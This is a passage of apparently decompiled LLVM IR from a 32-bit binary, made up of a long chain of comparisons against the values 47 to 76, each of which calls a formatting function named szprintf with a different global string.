  %v0_804a36f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a36f = zext i8 %v0_804a36f to i32
  store i32 %v1_804a36f, i32* @edx, align 4
  %v0_804a37b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a37b = zext i8 %v0_804a37b to i32
  %v2_804a38a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a38a, i32* @ebx, align 4
  %v5_804a391 = call i32 @szprintf(i32 %v2_804a38a, i32 ptrtoint ([13 x i8]* @global_var_80587d4.75 to i32), i32 %v1_804a37b, i32 %v1_804a36f)
  br label %dec_label_pc_804a399

dec_label_pc_804a399:                             ; preds = %dec_label_pc_804a369, %dec_label_pc_804a36f
  %v12_804a399 = icmp eq i32 %v11_8049ac4, 47
  %v1_804a39d = icmp eq i1 %v12_804a399, false
  br i1 %v1_804a39d, label %dec_label_pc_804a3c9, label %dec_label_pc_804a39f

dec_label_pc_804a39f:                             ; preds = %dec_label_pc_804a399
  %v0_804a39f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a39f = zext i8 %v0_804a39f to i32
  store i32 %v1_804a39f, i32* @edx, align 4
  %v0_804a3ab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a3ab = zext i8 %v0_804a3ab to i32
  %v2_804a3ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ba, i32* @ebx, align 4
  %v5_804a3c1 = call i32 @szprintf(i32 %v2_804a3ba, i32 ptrtoint ([13 x i8]* @global_var_80587e1.76 to i32), i32 %v1_804a3ab, i32 %v1_804a39f)
  br label %dec_label_pc_804a3c9

dec_label_pc_804a3c9:                             ; preds = %dec_label_pc_804a399, %dec_label_pc_804a39f
  %v9_804a3c9 = icmp eq i32 %v11_8049ac4, 48
  %v1_804a3cd = icmp eq i1 %v9_804a3c9, false
  br i1 %v1_804a3cd, label %dec_label_pc_804a3f9, label %dec_label_pc_804a3cf

dec_label_pc_804a3cf:                             ; preds = %dec_label_pc_804a3c9
  %v0_804a3cf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a3cf = zext i8 %v0_804a3cf to i32
  store i32 %v1_804a3cf, i32* @edx, align 4
  %v0_804a3db = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a3db = zext i8 %v0_804a3db to i32
  %v2_804a3ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ea, i32* @ebx, align 4
  %v5_804a3f1 = call i32 @szprintf(i32 %v2_804a3ea, i32 ptrtoint ([13 x i8]* @global_var_80587ee.77 to i32), i32 %v1_804a3db, i32 %v1_804a3cf)
  br label %dec_label_pc_804a3f9

dec_label_pc_804a3f9:                             ; preds = %dec_label_pc_804a3c9, %dec_label_pc_804a3cf
  %v12_804a3f9 = icmp eq i32 %v11_8049ac4, 49
  %v1_804a3fd = icmp eq i1 %v12_804a3f9, false
  br i1 %v1_804a3fd, label %dec_label_pc_804a429, label %dec_label_pc_804a3ff

dec_label_pc_804a3ff:                             ; preds = %dec_label_pc_804a3f9
  %v0_804a3ff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a3ff = zext i8 %v0_804a3ff to i32
  store i32 %v1_804a3ff, i32* @edx, align 4
  %v0_804a40b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a40b = zext i8 %v0_804a40b to i32
  %v2_804a41a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41a, i32* @ebx, align 4
  %v5_804a421 = call i32 @szprintf(i32 %v2_804a41a, i32 ptrtoint ([13 x i8]* @global_var_80587fb.78 to i32), i32 %v1_804a40b, i32 %v1_804a3ff)
  br label %dec_label_pc_804a429

dec_label_pc_804a429:                             ; preds = %dec_label_pc_804a3f9, %dec_label_pc_804a3ff
  %v12_804a429 = icmp eq i32 %v11_8049ac4, 50
  %v1_804a42d = icmp eq i1 %v12_804a429, false
  br i1 %v1_804a42d, label %dec_label_pc_804a459, label %dec_label_pc_804a42f

dec_label_pc_804a42f:                             ; preds = %dec_label_pc_804a429
  %v0_804a42f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a42f = zext i8 %v0_804a42f to i32
  store i32 %v1_804a42f, i32* @edx, align 4
  %v0_804a43b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a43b = zext i8 %v0_804a43b to i32
  %v2_804a44a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44a, i32* @ebx, align 4
  %v5_804a451 = call i32 @szprintf(i32 %v2_804a44a, i32 ptrtoint ([13 x i8]* @global_var_8058808.79 to i32), i32 %v1_804a43b, i32 %v1_804a42f)
  br label %dec_label_pc_804a459

dec_label_pc_804a459:                             ; preds = %dec_label_pc_804a429, %dec_label_pc_804a42f
  %v12_804a459 = icmp eq i32 %v11_8049ac4, 51
  %v1_804a45d = icmp eq i1 %v12_804a459, false
  br i1 %v1_804a45d, label %dec_label_pc_804a489, label %dec_label_pc_804a45f

dec_label_pc_804a45f:                             ; preds = %dec_label_pc_804a459
  %v0_804a45f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a45f = zext i8 %v0_804a45f to i32
  store i32 %v1_804a45f, i32* @edx, align 4
  %v0_804a46b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a46b = zext i8 %v0_804a46b to i32
  %v2_804a47a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a47a, i32* @ebx, align 4
  %v5_804a481 = call i32 @szprintf(i32 %v2_804a47a, i32 ptrtoint ([14 x i8]* @global_var_8058815.80 to i32), i32 %v1_804a46b, i32 %v1_804a45f)
  br label %dec_label_pc_804a489

dec_label_pc_804a489:                             ; preds = %dec_label_pc_804a459, %dec_label_pc_804a45f
  %v12_804a489 = icmp eq i32 %v11_8049ac4, 52
  %v1_804a48d = icmp eq i1 %v12_804a489, false
  br i1 %v1_804a48d, label %dec_label_pc_804a4b9, label %dec_label_pc_804a48f

dec_label_pc_804a48f:                             ; preds = %dec_label_pc_804a489
  %v0_804a48f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a48f = zext i8 %v0_804a48f to i32
  store i32 %v1_804a48f, i32* @edx, align 4
  %v0_804a49b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a49b = zext i8 %v0_804a49b to i32
  %v2_804a4aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4aa, i32* @ebx, align 4
  %v5_804a4b1 = call i32 @szprintf(i32 %v2_804a4aa, i32 ptrtoint ([13 x i8]* @global_var_8058823.81 to i32), i32 %v1_804a49b, i32 %v1_804a48f)
  br label %dec_label_pc_804a4b9

dec_label_pc_804a4b9:                             ; preds = %dec_label_pc_804a489, %dec_label_pc_804a48f
  %v12_804a4b9 = icmp eq i32 %v11_8049ac4, 53
  %v1_804a4bd = icmp eq i1 %v12_804a4b9, false
  br i1 %v1_804a4bd, label %dec_label_pc_804a4e9, label %dec_label_pc_804a4bf

dec_label_pc_804a4bf:                             ; preds = %dec_label_pc_804a4b9
  %v0_804a4bf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a4bf = zext i8 %v0_804a4bf to i32
  store i32 %v1_804a4bf, i32* @edx, align 4
  %v0_804a4cb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a4cb = zext i8 %v0_804a4cb to i32
  %v2_804a4da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4da, i32* @ebx, align 4
  %v5_804a4e1 = call i32 @szprintf(i32 %v2_804a4da, i32 ptrtoint ([14 x i8]* @global_var_8058830.82 to i32), i32 %v1_804a4cb, i32 %v1_804a4bf)
  br label %dec_label_pc_804a4e9

dec_label_pc_804a4e9:                             ; preds = %dec_label_pc_804a4b9, %dec_label_pc_804a4bf
  %v12_804a4e9 = icmp eq i32 %v11_8049ac4, 54
  %v1_804a4ed = icmp eq i1 %v12_804a4e9, false
  br i1 %v1_804a4ed, label %dec_label_pc_804a519, label %dec_label_pc_804a4ef

dec_label_pc_804a4ef:                             ; preds = %dec_label_pc_804a4e9
  %v0_804a4ef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a4ef = zext i8 %v0_804a4ef to i32
  store i32 %v1_804a4ef, i32* @edx, align 4
  %v0_804a4fb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a4fb = zext i8 %v0_804a4fb to i32
  %v2_804a50a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a50a, i32* @ebx, align 4
  %v5_804a511 = call i32 @szprintf(i32 %v2_804a50a, i32 ptrtoint ([13 x i8]* @global_var_805883e.83 to i32), i32 %v1_804a4fb, i32 %v1_804a4ef)
  br label %dec_label_pc_804a519

dec_label_pc_804a519:                             ; preds = %dec_label_pc_804a4e9, %dec_label_pc_804a4ef
  %v12_804a519 = icmp eq i32 %v11_8049ac4, 55
  %v1_804a51d = icmp eq i1 %v12_804a519, false
  br i1 %v1_804a51d, label %dec_label_pc_804a549, label %dec_label_pc_804a51f

dec_label_pc_804a51f:                             ; preds = %dec_label_pc_804a519
  %v0_804a51f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a51f = zext i8 %v0_804a51f to i32
  store i32 %v1_804a51f, i32* @edx, align 4
  %v0_804a52b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a52b = zext i8 %v0_804a52b to i32
  %v2_804a53a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a53a, i32* @ebx, align 4
  %v5_804a541 = call i32 @szprintf(i32 %v2_804a53a, i32 ptrtoint ([14 x i8]* @global_var_805884b.84 to i32), i32 %v1_804a52b, i32 %v1_804a51f)
  br label %dec_label_pc_804a549

dec_label_pc_804a549:                             ; preds = %dec_label_pc_804a519, %dec_label_pc_804a51f
  %v12_804a549 = icmp eq i32 %v11_8049ac4, 56
  %v1_804a54d = icmp eq i1 %v12_804a549, false
  br i1 %v1_804a54d, label %dec_label_pc_804a579, label %dec_label_pc_804a54f

dec_label_pc_804a54f:                             ; preds = %dec_label_pc_804a549
  %v0_804a54f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a54f = zext i8 %v0_804a54f to i32
  store i32 %v1_804a54f, i32* @edx, align 4
  %v0_804a55b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a55b = zext i8 %v0_804a55b to i32
  %v2_804a56a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a56a, i32* @ebx, align 4
  %v5_804a571 = call i32 @szprintf(i32 %v2_804a56a, i32 ptrtoint ([14 x i8]* @global_var_8058859.85 to i32), i32 %v1_804a55b, i32 %v1_804a54f)
  br label %dec_label_pc_804a579

dec_label_pc_804a579:                             ; preds = %dec_label_pc_804a549, %dec_label_pc_804a54f
  %v12_804a579 = icmp eq i32 %v11_8049ac4, 57
  %v1_804a57d = icmp eq i1 %v12_804a579, false
  br i1 %v1_804a57d, label %dec_label_pc_804a5a9, label %dec_label_pc_804a57f

dec_label_pc_804a57f:                             ; preds = %dec_label_pc_804a579
  %v0_804a57f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a57f = zext i8 %v0_804a57f to i32
  store i32 %v1_804a57f, i32* @edx, align 4
  %v0_804a58b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a58b = zext i8 %v0_804a58b to i32
  %v2_804a59a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a59a, i32* @ebx, align 4
  %v5_804a5a1 = call i32 @szprintf(i32 %v2_804a59a, i32 ptrtoint ([13 x i8]* @global_var_8058867.86 to i32), i32 %v1_804a58b, i32 %v1_804a57f)
  br label %dec_label_pc_804a5a9

dec_label_pc_804a5a9:                             ; preds = %dec_label_pc_804a579, %dec_label_pc_804a57f
  %v12_804a5a9 = icmp eq i32 %v11_8049ac4, 58
  %v1_804a5ad = icmp eq i1 %v12_804a5a9, false
  br i1 %v1_804a5ad, label %dec_label_pc_804a5d9, label %dec_label_pc_804a5af

dec_label_pc_804a5af:                             ; preds = %dec_label_pc_804a5a9
  %v0_804a5af = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a5af = zext i8 %v0_804a5af to i32
  store i32 %v1_804a5af, i32* @edx, align 4
  %v0_804a5bb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a5bb = zext i8 %v0_804a5bb to i32
  %v2_804a5ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5ca, i32* @ebx, align 4
  %v5_804a5d1 = call i32 @szprintf(i32 %v2_804a5ca, i32 ptrtoint ([13 x i8]* @global_var_8058874.87 to i32), i32 %v1_804a5bb, i32 %v1_804a5af)
  br label %dec_label_pc_804a5d9

dec_label_pc_804a5d9:                             ; preds = %dec_label_pc_804a5a9, %dec_label_pc_804a5af
  %v12_804a5d9 = icmp eq i32 %v11_8049ac4, 59
  %v1_804a5dd = icmp eq i1 %v12_804a5d9, false
  br i1 %v1_804a5dd, label %dec_label_pc_804a609, label %dec_label_pc_804a5df

dec_label_pc_804a5df:                             ; preds = %dec_label_pc_804a5d9
  %v0_804a5df = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a5df = zext i8 %v0_804a5df to i32
  store i32 %v1_804a5df, i32* @edx, align 4
  %v0_804a5eb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a5eb = zext i8 %v0_804a5eb to i32
  %v2_804a5fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fa, i32* @ebx, align 4
  %v5_804a601 = call i32 @szprintf(i32 %v2_804a5fa, i32 ptrtoint ([13 x i8]* @global_var_8058881.88 to i32), i32 %v1_804a5eb, i32 %v1_804a5df)
  br label %dec_label_pc_804a609

dec_label_pc_804a609:                             ; preds = %dec_label_pc_804a5d9, %dec_label_pc_804a5df
  %v12_804a609 = icmp eq i32 %v11_8049ac4, 60
  %v1_804a60d = icmp eq i1 %v12_804a609, false
  br i1 %v1_804a60d, label %dec_label_pc_804a639, label %dec_label_pc_804a60f

dec_label_pc_804a60f:                             ; preds = %dec_label_pc_804a609
  %v0_804a60f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a60f = zext i8 %v0_804a60f to i32
  store i32 %v1_804a60f, i32* @edx, align 4
  %v0_804a61b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a61b = zext i8 %v0_804a61b to i32
  %v2_804a62a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a62a, i32* @ebx, align 4
  %v5_804a631 = call i32 @szprintf(i32 %v2_804a62a, i32 ptrtoint ([13 x i8]* @global_var_805888e.89 to i32), i32 %v1_804a61b, i32 %v1_804a60f)
  br label %dec_label_pc_804a639

dec_label_pc_804a639:                             ; preds = %dec_label_pc_804a609, %dec_label_pc_804a60f
  %v12_804a639 = icmp eq i32 %v11_8049ac4, 61
  %v1_804a63d = icmp eq i1 %v12_804a639, false
  br i1 %v1_804a63d, label %dec_label_pc_804a669, label %dec_label_pc_804a63f

dec_label_pc_804a63f:                             ; preds = %dec_label_pc_804a639
  %v0_804a63f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a63f = zext i8 %v0_804a63f to i32
  store i32 %v1_804a63f, i32* @edx, align 4
  %v0_804a64b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a64b = zext i8 %v0_804a64b to i32
  %v2_804a65a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a65a, i32* @ebx, align 4
  %v5_804a661 = call i32 @szprintf(i32 %v2_804a65a, i32 ptrtoint ([13 x i8]* @global_var_805889b.90 to i32), i32 %v1_804a64b, i32 %v1_804a63f)
  br label %dec_label_pc_804a669

dec_label_pc_804a669:                             ; preds = %dec_label_pc_804a639, %dec_label_pc_804a63f
  %v12_804a669 = icmp eq i32 %v11_8049ac4, 62
  %v1_804a66d = icmp eq i1 %v12_804a669, false
  br i1 %v1_804a66d, label %dec_label_pc_804a699, label %dec_label_pc_804a66f

dec_label_pc_804a66f:                             ; preds = %dec_label_pc_804a669
  %v0_804a66f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a66f = zext i8 %v0_804a66f to i32
  store i32 %v1_804a66f, i32* @edx, align 4
  %v0_804a67b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a67b = zext i8 %v0_804a67b to i32
  %v2_804a68a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a68a, i32* @ebx, align 4
  %v5_804a691 = call i32 @szprintf(i32 %v2_804a68a, i32 ptrtoint ([13 x i8]* @global_var_80588a8.91 to i32), i32 %v1_804a67b, i32 %v1_804a66f)
  br label %dec_label_pc_804a699

dec_label_pc_804a699:                             ; preds = %dec_label_pc_804a669, %dec_label_pc_804a66f
  %v12_804a699 = icmp eq i32 %v11_8049ac4, 63
  %v1_804a69d = icmp eq i1 %v12_804a699, false
  br i1 %v1_804a69d, label %dec_label_pc_804a6c9, label %dec_label_pc_804a69f

dec_label_pc_804a69f:                             ; preds = %dec_label_pc_804a699
  %v0_804a69f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a69f = zext i8 %v0_804a69f to i32
  store i32 %v1_804a69f, i32* @edx, align 4
  %v0_804a6ab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a6ab = zext i8 %v0_804a6ab to i32
  %v2_804a6ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ba, i32* @ebx, align 4
  %v5_804a6c1 = call i32 @szprintf(i32 %v2_804a6ba, i32 ptrtoint ([13 x i8]* @global_var_80588b5.92 to i32), i32 %v1_804a6ab, i32 %v1_804a69f)
  br label %dec_label_pc_804a6c9

dec_label_pc_804a6c9:                             ; preds = %dec_label_pc_804a699, %dec_label_pc_804a69f
  %v9_804a6c9 = icmp eq i32 %v11_8049ac4, 64
  %v1_804a6cd = icmp eq i1 %v9_804a6c9, false
  br i1 %v1_804a6cd, label %dec_label_pc_804a6f9, label %dec_label_pc_804a6cf

dec_label_pc_804a6cf:                             ; preds = %dec_label_pc_804a6c9
  %v0_804a6cf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a6cf = zext i8 %v0_804a6cf to i32
  store i32 %v1_804a6cf, i32* @edx, align 4
  %v0_804a6db = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a6db = zext i8 %v0_804a6db to i32
  %v2_804a6ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ea, i32* @ebx, align 4
  %v5_804a6f1 = call i32 @szprintf(i32 %v2_804a6ea, i32 ptrtoint ([13 x i8]* @global_var_80588c2.93 to i32), i32 %v1_804a6db, i32 %v1_804a6cf)
  br label %dec_label_pc_804a6f9

dec_label_pc_804a6f9:                             ; preds = %dec_label_pc_804a6c9, %dec_label_pc_804a6cf
  %v12_804a6f9 = icmp eq i32 %v11_8049ac4, 65
  %v1_804a6fd = icmp eq i1 %v12_804a6f9, false
  br i1 %v1_804a6fd, label %dec_label_pc_804a729, label %dec_label_pc_804a6ff

dec_label_pc_804a6ff:                             ; preds = %dec_label_pc_804a6f9
  %v0_804a6ff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a6ff = zext i8 %v0_804a6ff to i32
  store i32 %v1_804a6ff, i32* @edx, align 4
  %v0_804a70b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a70b = zext i8 %v0_804a70b to i32
  %v2_804a71a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a71a, i32* @ebx, align 4
  %v5_804a721 = call i32 @szprintf(i32 %v2_804a71a, i32 ptrtoint ([13 x i8]* @global_var_80588cf.94 to i32), i32 %v1_804a70b, i32 %v1_804a6ff)
  br label %dec_label_pc_804a729

dec_label_pc_804a729:                             ; preds = %dec_label_pc_804a6f9, %dec_label_pc_804a6ff
  %v12_804a729 = icmp eq i32 %v11_8049ac4, 66
  %v1_804a72d = icmp eq i1 %v12_804a729, false
  br i1 %v1_804a72d, label %dec_label_pc_804a759, label %dec_label_pc_804a72f

dec_label_pc_804a72f:                             ; preds = %dec_label_pc_804a729
  %v0_804a72f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a72f = zext i8 %v0_804a72f to i32
  store i32 %v1_804a72f, i32* @edx, align 4
  %v0_804a73b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a73b = zext i8 %v0_804a73b to i32
  %v2_804a74a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a74a, i32* @ebx, align 4
  %v5_804a751 = call i32 @szprintf(i32 %v2_804a74a, i32 ptrtoint ([13 x i8]* @global_var_80588dc.95 to i32), i32 %v1_804a73b, i32 %v1_804a72f)
  br label %dec_label_pc_804a759

dec_label_pc_804a759:                             ; preds = %dec_label_pc_804a729, %dec_label_pc_804a72f
  %v12_804a759 = icmp eq i32 %v11_8049ac4, 67
  %v1_804a75d = icmp eq i1 %v12_804a759, false
  br i1 %v1_804a75d, label %dec_label_pc_804a789, label %dec_label_pc_804a75f

dec_label_pc_804a75f:                             ; preds = %dec_label_pc_804a759
  %v0_804a75f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a75f = zext i8 %v0_804a75f to i32
  store i32 %v1_804a75f, i32* @edx, align 4
  %v0_804a76b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a76b = zext i8 %v0_804a76b to i32
  %v2_804a77a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77a, i32* @ebx, align 4
  %v5_804a781 = call i32 @szprintf(i32 %v2_804a77a, i32 ptrtoint ([13 x i8]* @global_var_80588e9.96 to i32), i32 %v1_804a76b, i32 %v1_804a75f)
  br label %dec_label_pc_804a789

dec_label_pc_804a789:                             ; preds = %dec_label_pc_804a759, %dec_label_pc_804a75f
  %v12_804a789 = icmp eq i32 %v11_8049ac4, 68
  %v1_804a78d = icmp eq i1 %v12_804a789, false
  br i1 %v1_804a78d, label %dec_label_pc_804a7b9, label %dec_label_pc_804a78f

dec_label_pc_804a78f:                             ; preds = %dec_label_pc_804a789
  %v0_804a78f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a78f = zext i8 %v0_804a78f to i32
  store i32 %v1_804a78f, i32* @edx, align 4
  %v0_804a79b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a79b = zext i8 %v0_804a79b to i32
  %v2_804a7aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7aa, i32* @ebx, align 4
  %v5_804a7b1 = call i32 @szprintf(i32 %v2_804a7aa, i32 ptrtoint ([13 x i8]* @global_var_80588f6.97 to i32), i32 %v1_804a79b, i32 %v1_804a78f)
  br label %dec_label_pc_804a7b9

dec_label_pc_804a7b9:                             ; preds = %dec_label_pc_804a789, %dec_label_pc_804a78f
  %v12_804a7b9 = icmp eq i32 %v11_8049ac4, 69
  %v1_804a7bd = icmp eq i1 %v12_804a7b9, false
  br i1 %v1_804a7bd, label %dec_label_pc_804a7e9, label %dec_label_pc_804a7bf

dec_label_pc_804a7bf:                             ; preds = %dec_label_pc_804a7b9
  %v0_804a7bf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a7bf = zext i8 %v0_804a7bf to i32
  store i32 %v1_804a7bf, i32* @edx, align 4
  %v0_804a7cb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a7cb = zext i8 %v0_804a7cb to i32
  %v2_804a7da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7da, i32* @ebx, align 4
  %v5_804a7e1 = call i32 @szprintf(i32 %v2_804a7da, i32 ptrtoint ([13 x i8]* @global_var_8058903.98 to i32), i32 %v1_804a7cb, i32 %v1_804a7bf)
  br label %dec_label_pc_804a7e9

dec_label_pc_804a7e9:                             ; preds = %dec_label_pc_804a7b9, %dec_label_pc_804a7bf
  %v12_804a7e9 = icmp eq i32 %v11_8049ac4, 70
  %v1_804a7ed = icmp eq i1 %v12_804a7e9, false
  br i1 %v1_804a7ed, label %dec_label_pc_804a819, label %dec_label_pc_804a7ef

dec_label_pc_804a7ef:                             ; preds = %dec_label_pc_804a7e9
  %v0_804a7ef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a7ef = zext i8 %v0_804a7ef to i32
  store i32 %v1_804a7ef, i32* @edx, align 4
  %v0_804a7fb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a7fb = zext i8 %v0_804a7fb to i32
  %v2_804a80a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a80a, i32* @ebx, align 4
  %v5_804a811 = call i32 @szprintf(i32 %v2_804a80a, i32 ptrtoint ([13 x i8]* @global_var_8058910.99 to i32), i32 %v1_804a7fb, i32 %v1_804a7ef)
  br label %dec_label_pc_804a819

dec_label_pc_804a819:                             ; preds = %dec_label_pc_804a7e9, %dec_label_pc_804a7ef
  %v12_804a819 = icmp eq i32 %v11_8049ac4, 71
  %v1_804a81d = icmp eq i1 %v12_804a819, false
  br i1 %v1_804a81d, label %dec_label_pc_804a849, label %dec_label_pc_804a81f

dec_label_pc_804a81f:                             ; preds = %dec_label_pc_804a819
  %v0_804a81f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a81f = zext i8 %v0_804a81f to i32
  store i32 %v1_804a81f, i32* @edx, align 4
  %v0_804a82b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a82b = zext i8 %v0_804a82b to i32
  %v2_804a83a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a83a, i32* @ebx, align 4
  %v5_804a841 = call i32 @szprintf(i32 %v2_804a83a, i32 ptrtoint ([13 x i8]* @global_var_805891d.100 to i32), i32 %v1_804a82b, i32 %v1_804a81f)
  br label %dec_label_pc_804a849

dec_label_pc_804a849:                             ; preds = %dec_label_pc_804a819, %dec_label_pc_804a81f
  %v12_804a849 = icmp eq i32 %v11_8049ac4, 72
  %v1_804a84d = icmp eq i1 %v12_804a849, false
  br i1 %v1_804a84d, label %dec_label_pc_804a879, label %dec_label_pc_804a84f

dec_label_pc_804a84f:                             ; preds = %dec_label_pc_804a849
  %v0_804a84f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a84f = zext i8 %v0_804a84f to i32
  store i32 %v1_804a84f, i32* @edx, align 4
  %v0_804a85b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a85b = zext i8 %v0_804a85b to i32
  %v2_804a86a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a86a, i32* @ebx, align 4
  %v5_804a871 = call i32 @szprintf(i32 %v2_804a86a, i32 ptrtoint ([13 x i8]* @global_var_805892a.101 to i32), i32 %v1_804a85b, i32 %v1_804a84f)
  br label %dec_label_pc_804a879

dec_label_pc_804a879:                             ; preds = %dec_label_pc_804a849, %dec_label_pc_804a84f
  %v12_804a879 = icmp eq i32 %v11_8049ac4, 73
  %v1_804a87d = icmp eq i1 %v12_804a879, false
  br i1 %v1_804a87d, label %dec_label_pc_804a8a9, label %dec_label_pc_804a87f

dec_label_pc_804a87f:                             ; preds = %dec_label_pc_804a879
  %v0_804a87f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a87f = zext i8 %v0_804a87f to i32
  store i32 %v1_804a87f, i32* @edx, align 4
  %v0_804a88b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a88b = zext i8 %v0_804a88b to i32
  %v2_804a89a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a89a, i32* @ebx, align 4
  %v5_804a8a1 = call i32 @szprintf(i32 %v2_804a89a, i32 ptrtoint ([13 x i8]* @global_var_8058937.102 to i32), i32 %v1_804a88b, i32 %v1_804a87f)
  br label %dec_label_pc_804a8a9

dec_label_pc_804a8a9:                             ; preds = %dec_label_pc_804a879, %dec_label_pc_804a87f
  %v12_804a8a9 = icmp eq i32 %v11_8049ac4, 74
  %v1_804a8ad = icmp eq i1 %v12_804a8a9, false
  br i1 %v1_804a8ad, label %dec_label_pc_804a8d9, label %dec_label_pc_804a8af

dec_label_pc_804a8af:                             ; preds = %dec_label_pc_804a8a9
  %v0_804a8af = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a8af = zext i8 %v0_804a8af to i32
  store i32 %v1_804a8af, i32* @edx, align 4
  %v0_804a8bb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a8bb = zext i8 %v0_804a8bb to i32
  %v2_804a8ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8ca, i32* @ebx, align 4
  %v5_804a8d1 = call i32 @szprintf(i32 %v2_804a8ca, i32 ptrtoint ([13 x i8]* @global_var_8058944.103 to i32), i32 %v1_804a8bb, i32 %v1_804a8af)
  br label %dec_label_pc_804a8d9

dec_label_pc_804a8d9:                             ; preds = %dec_label_pc_804a8a9, %dec_label_pc_804a8af
  %v12_804a8d9 = icmp eq i32 %v11_8049ac4, 75
  %v1_804a8dd = icmp eq i1 %v12_804a8d9, false
  br i1 %v1_804a8dd, label %dec_label_pc_804a909, label %dec_label_pc_804a8df

dec_label_pc_804a8df:                             ; preds = %dec_label_pc_804a8d9
  %v0_804a8df = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a8df = zext i8 %v0_804a8df to i32
  store i32 %v1_804a8df, i32* @edx, align 4
  %v0_804a8eb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a8eb = zext i8 %v0_804a8eb to i32
  %v2_804a8fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8fa, i32* @ebx, align 4
  %v5_804a901 = call i32 @szprintf(i32 %v2_804a8fa, i32 ptrtoint ([13 x i8]* @global_var_8058951.104 to i32), i32 %v1_804a8eb, i32 %v1_804a8df)
  br label %dec_label_pc_804a909

dec_label_pc_804a909:                             ; preds = %dec_label_pc_804a8d9, %dec_label_pc_804a8df
  %v12_804a909 = icmp eq i32 %v11_8049ac4, 76
  %v1_804a90d = icmp eq i1 %v12_804a909, false
  br i1 %v1_804a90d, label %dec_label_pc_804a939, label %dec_label_pc_804a90f

